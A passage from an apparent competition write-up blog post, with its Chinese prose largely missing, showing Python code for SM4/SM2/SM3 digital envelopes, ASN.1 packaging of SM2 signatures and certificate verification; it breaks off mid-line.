    <content type="html"><![CDATA[<p><strong></strong>(bushi)</p><p></p><p><strong> sm4 sm2</strong> </p><p><strong>Rank: 90+/205</strong>90AK()AK</p><p><img src="https://picx.zhimg.com/80/v2-e27b748bcf186cc8475d699cc535386a_1440w.png" alt="" /></p><h2 id="1"><a class="markdownIt-Anchor" href="#1"></a> 1*</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sm4_encrypt.py</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> pyasn1.codec.der.decoder <span class="keyword">import</span> decode</span><br><span class="line"><span class="keyword">from</span> pyasn1.<span class="built_in">type</span> <span class="keyword">import</span> univ, namedtype</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm3, func, sm2</span><br><span class="line"><span class="keyword">from</span> pyasn1.codec.der.encoder <span class="keyword">import</span> encode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SM2Cipher</span>(univ.<span class="type">Sequence</span>):</span><br><span class="line">    componentType = namedtype.NamedTypes(</span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;xCoordinate&#x27;</span>, univ.Integer()), <span class="comment"># -- x </span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;yCoordinate&#x27;</span>, univ.Integer()),             <span class="comment"># -- y </span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;hash&#x27;</span>, univ.OctetString()),                <span class="comment"># --</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;cipherText&#x27;</span>, univ.OctetString())           <span class="comment"># -- SM4</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EncryptedData</span>(univ.<span class="type">Sequence</span>):</span><br><span class="line">    componentType = namedtype.NamedTypes(</span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;algorithm&#x27;</span>, univ.ObjectIdentifier(<span class="string">&#x27;1.2.156.10197.1.104.2&#x27;</span>)), <span class="comment"># -- SM4-CBC OID</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;iv&#x27;</span>, univ.OctetString()),                                                <span class="comment"># -- SM4-CBCIV</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;cipherText&#x27;</span>, univ.OctetString())                                         <span class="comment"># -- SM4</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EnvelopedData</span>(univ.<span class="type">Sequence</span>):</span><br><span class="line">    componentType = namedtype.NamedTypes(</span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;encryptedKey&#x27;</span>, SM2Cipher()),                           <span class="comment"># -- SM2SM4</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;encryptedData&#x27;</span>, EncryptedData()),                                  <span class="comment">#  -- SM4</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;digestAlgorithm&#x27;</span>, univ.ObjectIdentifier(<span class="string">&#x27;1.2.156.10197.1.401.1&#x27;</span>)), <span class="comment"># -- SM3OID</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;digest&#x27;</span>, univ.OctetString())                                       <span class="comment"># -- </span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sm4_cbc_encrypt</span>(<span class="params">plaintext: <span class="built_in">bytes</span>, key: <span class="built_in">bytes</span>, iv: <span class="built_in">bytes</span></span>):</span><br><span class="line">    backend = default_backend()</span><br><span class="line">    cipher = Cipher(algorithms.SM4(key), modes.CBC(iv), backend=backend) <span class="comment"># nopadding</span></span><br><span class="line">    encryptor = cipher.encryptor()</span><br><span class="line">    ciphertext = encryptor.update(plaintext) + encryptor.finalize()</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sm2_encrypt</span>(<span class="params">plaintext: <span class="built_in">bytes</span>,public_key:<span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    sm2_crypt = sm2.CryptSM2(private_key=<span class="string">&quot;&quot;</span>,public_key=public_key.<span class="built_in">hex</span>())</span><br><span class="line">    ciphertext = sm2_crypt.encrypt(plaintext)</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sm3_hash</span>(<span class="params">text:<span class="built_in">bytes</span></span>):</span><br><span class="line">    hash_value = sm3.sm3_hash(func.bytes_to_list(text))</span><br><span class="line">    <span class="keyword">return</span> hash_value</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_key_from_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            key = file.read().strip()</span><br><span class="line">            <span class="keyword">return</span> key</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;:  <span class="subst">&#123;file_path&#125;</span> &quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;:  <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># abcd</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sm4_encrypt</span>(<span class="params">plaintext:<span class="built_in">str</span>,sm2_public_key: <span class="built_in">str</span>,sm4_iv:<span class="built_in">str</span></span>):</span><br><span class="line">    sm4_key = <span class="built_in">bytes</span>.fromhex(read_key_from_file(<span class="string">&quot;key.txt&quot;</span>)) <span class="comment">#key</span></span><br><span class="line">    <span class="comment"># sm4</span></span><br><span class="line">    envelope = EnvelopedData()</span><br><span class="line">    plaintext_bytes = plaintext.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    ciphertext = sm4_cbc_encrypt(plaintext_bytes,sm4_key,<span class="built_in">bytes</span>.fromhex(sm4_iv))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># sm2</span></span><br><span class="line">    encrypted_key = sm2_encrypt(sm4_key,<span class="built_in">bytes</span>.fromhex(sm2_public_key))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># sm3</span></span><br><span class="line">    digest = sm3_hash(plaintext_bytes)</span><br><span class="line"></span><br><span class="line">    envelope[<span class="string">&#x27;encryptedData&#x27;</span>] = EncryptedData()</span><br><span class="line">    envelope[<span class="string">&#x27;encryptedData&#x27;</span>][<span class="string">&#x27;iv&#x27;</span>] = univ.OctetString(<span class="built_in">bytes</span>.fromhex(sm4_iv))</span><br><span class="line">    envelope[<span class="string">&#x27;encryptedData&#x27;</span>][<span class="string">&#x27;cipherText&#x27;</span>] = univ.OctetString(ciphertext)</span><br><span class="line"></span><br><span class="line">    envelope[<span class="string">&#x27;encryptedKey&#x27;</span>] = SM2Cipher()</span><br><span class="line">    envelope[<span class="string">&#x27;encryptedKey&#x27;</span>][<span class="string">&#x27;xCoordinate&#x27;</span>] = univ.Integer(<span class="built_in">int</span>.from_bytes(encrypted_key[:<span class="number">32</span>], <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">    envelope[<span class="string">&#x27;encryptedKey&#x27;</span>][<span class="string">&#x27;yCoordinate&#x27;</span>] = univ.Integer(<span class="built_in">int</span>.from_bytes(encrypted_key[<span class="number">32</span>:<span class="number">64</span>], <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">    envelope[<span class="string">&#x27;encryptedKey&#x27;</span>][<span class="string">&#x27;hash&#x27;</span>] = univ.OctetString(encrypted_key[<span class="number">64</span>:<span class="number">96</span>])</span><br><span class="line">    envelope[<span class="string">&#x27;encryptedKey&#x27;</span>][<span class="string">&#x27;cipherText&#x27;</span>] = univ.OctetString(encrypted_key[<span class="number">96</span>:])</span><br><span class="line"></span><br><span class="line">    envelope[<span class="string">&#x27;digest&#x27;</span>] = univ.OctetString(<span class="built_in">bytes</span>.fromhex(digest))</span><br><span class="line">    <span class="keyword">return</span> encode(envelope).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># asn116</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">asn1_parse</span>(<span class="params">asn1_hex_str:<span class="built_in">str</span>,asn1_spec</span>):</span><br><span class="line">    <span class="comment"># 16</span></span><br><span class="line">    der_bytes = binascii.unhexlify(asn1_hex_str)</span><br><span class="line">    <span class="comment"># ASN.1</span></span><br><span class="line">    enveloped_data, _ = decode(der_bytes, asn1Spec=asn1_spec)</span><br><span class="line">    <span class="comment"># sm2</span></span><br><span class="line">    sm2_x = <span class="built_in">hex</span>(<span class="built_in">int</span>(enveloped_data[<span class="string">&#x27;encryptedKey&#x27;</span>][<span class="string">&#x27;xCoordinate&#x27;</span>]))[<span class="number">2</span>:]</span><br><span class="line">    sm2_y = <span class="built_in">hex</span>(<span class="built_in">int</span>(enveloped_data[<span class="string">&#x27;encryptedKey&#x27;</span>][<span class="string">&#x27;yCoordinate&#x27;</span>]))[<span class="number">2</span>:]</span><br><span class="line">    sm2_hash = enveloped_data[<span class="string">&#x27;encryptedKey&#x27;</span>][<span class="string">&#x27;hash&#x27;</span>].asOctets().<span class="built_in">hex</span>()</span><br><span class="line">    sm2_ciphertext = enveloped_data[<span class="string">&#x27;encryptedKey&#x27;</span>][<span class="string">&#x27;cipherText&#x27;</span>].asOctets().<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># sm4</span></span><br><span class="line">    sm4_algorithm = <span class="built_in">str</span>(enveloped_data[<span class="string">&#x27;encryptedData&#x27;</span>][<span class="string">&#x27;algorithm&#x27;</span>])</span><br><span class="line">    sm4_iv = enveloped_data[<span class="string">&#x27;encryptedData&#x27;</span>][<span class="string">&#x27;iv&#x27;</span>].asOctets().<span class="built_in">hex</span>()</span><br><span class="line">    sm4_cipherText = enveloped_data[<span class="string">&#x27;encryptedData&#x27;</span>][<span class="string">&#x27;cipherText&#x27;</span>].asOctets().<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># sm3</span></span><br><span class="line">    digestAlgorithm = <span class="built_in">str</span>(enveloped_data[<span class="string">&#x27;digestAlgorithm&#x27;</span>])</span><br><span class="line">    digest = enveloped_data[<span class="string">&#x27;digest&#x27;</span>].asOctets().<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;asn116:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  asn1: <span class="subst">&#123;asn1_hex_str&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;SM2:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  xCoordinate: <span class="subst">&#123;sm2_x&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  yCoordinate: <span class="subst">&#123;sm2_y&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  hash: <span class="subst">&#123;sm2_hash&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  cipherText: <span class="subst">&#123;sm2_ciphertext&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;SM4:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  algorithm: <span class="subst">&#123;sm4_algorithm&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  iv: <span class="subst">&#123;sm4_iv&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  cipherText: <span class="subst">&#123;sm4_cipherText&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;SM3:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  digestAlgorithm: <span class="subst">&#123;digestAlgorithm&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  digest: <span class="subst">&#123;digest&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    plaintext = <span class="string">&quot;6163616263626161626461646464636361626263626464626361616164636462636462646461646461626462646361636264616364646462646462626261636261646163626463636262616462646462616362616363646463646361616263646261636164636263646163646161636164646364646261626463636462636162636162646261626163636161616463616261646264616162646162626162626462616363616161636362616461626463616462646261626264626464626262636363636162616261626163616164616462626163636164646161646361626363646462626261636261636164646262646362616263636363626461636164646261636361646463616161626164626461636163636461646164616161616163616164636164646261646163626163636164616162636263616461636261646264626263626264636164646263616164626463626461646364616362626261616262616264616361626264636264616461646163626364626462636161636262636163616261616262626362636463616263616364616363626163636363636262646363616464626461616363646361626162636261636364646362626462616364626462626161616264636162626263626462626264646162626462616261616264626161616363636364616263626461636162616462616363616461646363636261636363616162646164626361616464646463646263646363636164626164646463646361636364616261626261646461646463626161616361626161626362626262636164626463636163626163616163636262646463646162616363616364636164646364626464626164626162636161616263646164636461626161636262646463636462646161636462626264626463646364636362626264616362646462636263616361626262616464636263616464616363646163616262616162626261626261616461636361636164636162626461646264636162646363636263616363646161636464626161616462636464646164616361646264616361626263646264616162636164636462616164646163616461646362626464&quot;</span></span><br><span class="line">    sm2_key = <span class="string">&quot;044f66804d1d30f4499377b96dc8e18faab8300ebddf3eb0fa2065214c260d64c08c6dfe7d9923d6d5baa3a0512a2ede03357c723230ebf77906f82dc1b0fccc1e&quot;</span></span><br><span class="line">    iv = <span class="string">&quot;43d4192f9f74e90543d4192f9f74e905&quot;</span></span><br><span class="line">    asn1_hex_str = sm4_encrypt(<span class="built_in">bytes</span>.fromhex(plaintext).decode(<span class="string">&#x27;utf-8&#x27;</span>),sm2_key,iv)</span><br><span class="line">    asn1_parse(asn1_hex_str,EnvelopedData())</span><br></pre></td></tr></table></figure><h2 id="2"><a class="markdownIt-Anchor" href="#2"></a> 2*</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sm2_verify.py</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> pyasn1.<span class="built_in">type</span> <span class="keyword">import</span> univ, namedtype</span><br><span class="line"><span class="keyword">from</span> pyasn1.codec.der.encoder <span class="keyword">import</span> encode</span><br><span class="line"><span class="keyword">from</span> pyasn1.codec.der.decoder <span class="keyword">import</span> decode</span><br><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm2</span><br><span class="line"><span class="keyword">from</span> pyasn1.codec.der <span class="keyword">import</span> decoder, encoder</span><br><span class="line"><span class="keyword">from</span> pyasn1_modules <span class="keyword">import</span> rfc2459</span><br><span class="line"><span class="keyword">from</span> gmssl.sm2 <span class="keyword">import</span> CryptSM2</span><br><span class="line"><span class="keyword">from</span> pyasn1.<span class="built_in">type</span>.useful <span class="keyword">import</span> GeneralizedTime</span><br><span class="line"><span class="keyword">from</span> pyasn1.<span class="built_in">type</span>.univ <span class="keyword">import</span> <span class="type">Sequence</span></span><br><span class="line"><span class="keyword">from</span> pyasn1.<span class="built_in">type</span> <span class="keyword">import</span> useful</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ECPrimeFieldConfig</span>(univ.<span class="type">Sequence</span>):</span><br><span class="line">    componentType = namedtype.NamedTypes(</span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;fieldType&#x27;</span>, univ.ObjectIdentifier(<span class="string">&#x27;1.2.840.10045.1.1&#x27;</span>)),  <span class="comment"># Prime field OID</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;prime&#x27;</span>, univ.Integer()),  <span class="comment"># Prime number p</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ECCurveParameters</span>(univ.<span class="type">Sequence</span>):</span><br><span class="line">    componentType = namedtype.NamedTypes(</span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;coefficientA&#x27;</span>, univ.OctetString()),  <span class="comment"># Curve coefficient a</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;coefficientB&#x27;</span>, univ.OctetString()),  <span class="comment"># Curve coefficient b</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ECDomainParameters</span>(univ.<span class="type">Sequence</span>):</span><br><span class="line">    componentType = namedtype.NamedTypes(</span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;version&#x27;</span>, univ.Integer(<span class="number">1</span>)),  <span class="comment"># Version number (1)</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;fieldParameters&#x27;</span>, ECPrimeFieldConfig()),  <span class="comment"># Field parameters oidp</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;curveParameters&#x27;</span>, ECCurveParameters()),  <span class="comment"># Curve parameters ab</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;basePoint&#x27;</span>, univ.OctetString()),  <span class="comment"># Base point G </span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;order&#x27;</span>, univ.Integer()),  <span class="comment"># Order n of base point n</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;cofactor&#x27;</span>, univ.Integer(<span class="number">1</span>)),  <span class="comment"># Cofactor  1</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SM2SignatureValue</span>(univ.<span class="type">Sequence</span>):</span><br><span class="line">    componentType = namedtype.NamedTypes(</span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;r&#x27;</span>, univ.Integer()),  <span class="comment"># First part of signature</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;s&#x27;</span>, univ.Integer()),  <span class="comment"># Second part of signature</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SM2SignedData</span>(univ.<span class="type">Sequence</span>):</span><br><span class="line">    componentType = namedtype.NamedTypes(</span><br><span class="line">        <span class="comment"># version</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;version&#x27;</span>, univ.Integer()),</span><br><span class="line">        <span class="comment">#  OIDSM3</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;digestAlgorithms&#x27;</span>, univ.ObjectIdentifier()),</span><br><span class="line">        <span class="comment">#  r, s</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;sm2Signature&#x27;</span>, SM2SignatureValue()),</span><br><span class="line">        <span class="comment"># </span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;ecDomainParameters&#x27;</span>, ECDomainParameters()),</span><br><span class="line">        <span class="comment"># </span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;certificate&#x27;</span>, univ.OctetString()),</span><br><span class="line">        <span class="comment"># </span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;timestamp&#x27;</span>, GeneralizedTime()),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 16,gxy16</span></span><br><span class="line"><span class="comment"># p,a,b,n,g;r,s</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">asn1_package</span>(<span class="params">version, oid, signature, curve_params, cert_hex, time_stamp</span>):</span><br><span class="line">    sm2_signed_data = SM2SignedData()</span><br><span class="line">    <span class="comment"># version</span></span><br><span class="line">    sm2_signed_data[<span class="string">&#x27;version&#x27;</span>] = version</span><br><span class="line">    <span class="comment">#  OIDSM3</span></span><br><span class="line">    sm2_signed_data[<span class="string">&#x27;digestAlgorithms&#x27;</span>] = oid</span><br><span class="line">    <span class="comment">#  r, s</span></span><br><span class="line">    sm2_signed_data[<span class="string">&quot;sm2Signature&quot;</span>] = SM2SignatureValue()</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;sm2Signature&quot;</span>][<span class="string">&#x27;r&#x27;</span>] = <span class="built_in">int</span>(signature[:<span class="number">64</span>], <span class="number">16</span>)</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;sm2Signature&quot;</span>][<span class="string">&#x27;s&#x27;</span>] = <span class="built_in">int</span>(signature[<span class="number">64</span>:], <span class="number">16</span>)</span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    sm2_signed_data[<span class="string">&quot;ecDomainParameters&quot;</span>] = ECDomainParameters()</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;ecDomainParameters&quot;</span>][<span class="string">&quot;fieldParameters&quot;</span>] = ECPrimeFieldConfig()</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;ecDomainParameters&quot;</span>][<span class="string">&quot;fieldParameters&quot;</span>][<span class="string">&quot;prime&quot;</span>] = <span class="built_in">int</span>(curve_params[<span class="string">&#x27;p&#x27;</span>], <span class="number">16</span>)</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;ecDomainParameters&quot;</span>][<span class="string">&quot;curveParameters&quot;</span>] = ECCurveParameters()</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;ecDomainParameters&quot;</span>][<span class="string">&quot;curveParameters&quot;</span>][<span class="string">&quot;coefficientA&quot;</span>] = univ.OctetString(</span><br><span class="line">        <span class="built_in">bytes</span>.fromhex(curve_params[<span class="string">&#x27;a&#x27;</span>]))</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;ecDomainParameters&quot;</span>][<span class="string">&quot;curveParameters&quot;</span>][<span class="string">&quot;coefficientB&quot;</span>] = univ.OctetString(</span><br><span class="line">        <span class="built_in">bytes</span>.fromhex(curve_params[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;ecDomainParameters&quot;</span>][<span class="string">&#x27;basePoint&#x27;</span>] = univ.OctetString(<span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;04&#x27;</span> + curve_params[<span class="string">&#x27;g&#x27;</span>]))</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;ecDomainParameters&quot;</span>][<span class="string">&#x27;order&#x27;</span>] = <span class="built_in">int</span>(curve_params[<span class="string">&#x27;n&#x27;</span>], <span class="number">16</span>)</span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    sm2_signed_data[<span class="string">&quot;certificate&quot;</span>] = univ.OctetString(<span class="built_in">bytes</span>.fromhex(cert_hex))</span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    dt = datetime.strptime(time_stamp, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line">    asn1_time_str = dt.strftime(<span class="string">&quot;%Y%m%d%H%M%SZ&quot;</span>)</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;timestamp&quot;</span>] = GeneralizedTime(asn1_time_str)</span><br><span class="line">    <span class="keyword">return</span> encode(sm2_signed_data).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sm2CertVerifier</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, cert_hex: <span class="built_in">str</span></span>):</span><br><span class="line">        ca_pubkey = <span class="string">&quot;8E1860588D9900C16BD19A0FE0A5ACC600224DBD794FFD34179E03698D52421F46E6D8C6E8AADE512C7B543395AC39C76384726C7F8BA537ABCA0C129ECD9882&quot;</span></span><br><span class="line">        self.sm2_crypt = sm2.CryptSM2(public_key=ca_pubkey, private_key=<span class="literal">None</span>)</span><br><span class="line">        self.cert_tbs, self.signature_bytes, self.cert = self.parse_cert(<span class="built_in">bytes</span>.fromhex(cert_hex))</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_cert</span>(<span class="params">cert_der_bytes: <span class="built_in">bytes</span></span>):</span><br><span class="line">        cert, _ = decoder.decode(cert_der_bytes, asn1Spec=rfc2459.Certificate())</span><br><span class="line">        tbs = cert.getComponentByName(<span class="string">&#x27;tbsCertificate&#x27;</span>)</span><br><span class="line">        signature_bytes = cert.getComponentByName(<span class="string">&#x27;signatureValue&#x27;</span>).asOctets()</span><br><span class="line">        <span class="keyword">return</span> tbs, signature_bytes, cert</span><br><span class="line"></span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode_rs_from_der</span>(<span class="params">self, signature: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        seq, _ = decode(signature, asn1Spec=<span class="type">Sequence</span>())</span><br><span class="line">        r = <span class="built_in">int</span>(seq[<span class="number">0</span>])</span><br><span class="line">        s = <span class="built_in">int</span>(seq[<span class="number">1</span>])</span><br><span class="line">        r_bytes = r.to_bytes(<span class="number">32</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        s_bytes = s.to_bytes(<span class="number">32</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> r_bytes + s_bytes</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify_signature</span>(<span class="params">self, signature: <span class="built_in">bytes</span>, tbs: <span class="built_in">str</span></span>):</span><br><span class="line">        inter_cert_tbs_der = encoder.encode(tbs)</span><br><span class="line">        inter_signature = self.decode_rs_from_der(signature)</span><br><span class="line">        <span class="comment"># tbs_der64</span></span><br><span class="line">        <span class="keyword">return</span> self.sm2_crypt.verify_with_sm3(inter_signature.<span class="built_in">hex</span>(), inter_cert_tbs_der)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify_certificate_expiration_date</span>(<span class="params">self, tbs</span>):</span><br><span class="line">        validity = tbs.getComponentByName(<span class="string">&#x27;validity&#x27;</span>)</span><br><span class="line">        not_before = validity.getComponentByName(<span class="string">&#x27;notBefore&#x27;</span>).getComponent()</span><br><span class="line">        not_after = validity.getComponentByName(<span class="string">&#x27;notAfter&#x27;</span>).getComponent()</span><br><span class="line"></span><br><span class="line">        <span class="comment">#  UTCTime  GeneralizedTime </span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(not_before, useful.UTCTime):</span><br><span class="line">            not_before_time = datetime.strptime(<span class="built_in">str</span>(not_before), <span class="string">&quot;%y%m%d%H%M%SZ&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(not_before, useful.GeneralizedTime):</span><br><span class="line">            not_before_time = datetime.strptime(<span class="built_in">str</span>(not_before), <span class="string">&quot;%Y%m%d%H%M%SZ&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Unsupported notBefore time format&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(not_after, useful.UTCTime):</span><br><span class="line">            not_after_time = datetime.strptime(<span class="built_in">str</span>(not_after), <span class="string">&quot;%y%m%d%H%M%SZ&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(not_after, useful.GeneralizedTime):</span><br><span class="line">            not_after_time = datetime.strptime(<span class="built_in">str</span>(not_after), <span class="string">&quot;%Y%m%d%H%M%SZ&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Unsupported notAfter time format&quot;</span>)</span><br><span class="line"></span><br><span class="line">        now = datetime.now()</span><br><span class="line">        <span class="keyword">return</span> not_before_time &lt;= now &lt;= not_after_time</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># </span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.verify_certificate_expiration_date(self.cert_tbs):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment"># </span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.verify_signature(self.signature_bytes, self.cert_tbs):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SM2Config</span>:</span><br><span class="line">    <span class="comment"># sm2</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, asn1_str</span>):</span><br><span class="line">        self.sm2_signed_data,asn1_acess = self.hex_to_asn1(asn1_str, SM2SignedData())</span><br><span class="line">        <span class="keyword">if</span> 